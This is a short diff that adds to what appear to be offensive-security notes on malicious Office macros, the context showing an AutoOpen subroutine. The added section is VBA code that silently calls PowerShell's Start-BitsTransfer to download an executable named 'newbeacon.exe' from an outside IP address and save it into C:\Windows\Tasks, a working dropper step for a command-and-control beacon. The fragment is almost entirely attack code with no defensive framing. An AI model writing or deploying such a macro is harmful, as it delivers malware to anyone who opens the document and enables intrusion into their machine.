@@ -65,3 +65,11 @@ Sub AutoOpen()
 End Sub
 
 ```
+
+#### shell downloadn works so far
+
+```
+ Dim str As String
+    str = "powershell -c Start-bitstransfer -source http://192.168.49.141:80/newbeacon.exe -destination C:\\Windows\\Tasks\\newbeacon.exe"
+    Shell str, vbHide
+```
